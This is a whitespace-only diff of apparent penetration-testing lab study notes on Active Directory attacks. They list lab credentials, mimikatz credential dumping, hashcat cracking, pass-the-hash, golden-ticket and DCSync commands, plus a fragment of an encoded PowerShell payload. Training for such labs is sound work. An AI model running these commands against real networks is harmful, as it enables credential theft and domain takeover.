@@ -4451,8 +4451,8 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
 ### Attacking active drectiory authentication
 - `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`
 - `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.70 /cert:ignore /drive:share,/home/kali/share`
-- powershell -ep bypass
-- Import-Module .\PowerView.ps1
+- powershell -ep bypass  
+- Import-Module .\PowerView.ps1  
 
 - password attacks
   - view policy  
@@ -4544,12 +4544,12 @@ jeffadmin:BrouhahaTungPerorateBroom2023! (DC1)
 dave: (privilege on web04)  
 offsec:lab (admin)  
 
-**RDP**
+**RDP**  
 `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.158.75 /cert:ignore /drive:share,/home/kali/share`  
 `xfreerdp3 /u:offsec /p:lab /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share`  (local admin without 'd')  
 `rdesktop -u backupuser -p DonovanJadeKnight1 -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.158.70`  
 
-**PowerView.ps1 (admin PS)**
+**PowerView.ps1 (admin PS)**  
 `PS C:\Tools> powershell -ep bypass`  
 `PS C:\Tools> Import-Module .\PowerView.ps1'  
 'PS C:\Tools> Get-NetUser | select cn`  
@@ -4558,7 +4558,7 @@ offsec:lab (admin)
 `mimikatz # privilege::debug`  
 `mimikatz # sekurlsa::tickets` //lists kereros tickets in memory  
 
-**obtain hash**
+**obtain hash**  
 `mimikatz # sekurlsa::logonpasswords`  //Dumps cleartext passwords, NTLM hashes, and Kerberos tickets  
 `mimikatz # lsadump::sam` //Dumps local SAM database hashes (requires SYSTEM)  
 `mimikatz # lsadump::lsa /patch`  //Dumps cached domain credentials (Administrator, krbtgt, etc)  
@@ -4566,9 +4566,9 @@ offsec:lab (admin)
 **Hashcat - crack the hash**   
 `kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  //descync  
 `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  //AS-REP  
-`kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` //Kerberoasting from .\Rubeus.exe
+`kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` //Kerberoasting from .\Rubeus.exe  
 
-**Attack**
+**Attack**  
 `mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH /run:cmd.exe`  //Pass-the-Hash  
 `mimikatz # kerberos::golden /user:USERNAME /domain:DOMAIN /sid:<domain SID> /krbtgt:<krbtgt hash> /id:500 /ptt`  //golden-ticket  
 `mimikatz # lsadump::dcsync /domain:corp.com /user:<Administrator/krbtgt>` //Requests replication from a DC, extracts NTLM hashes directly without dumping ntds.dit  
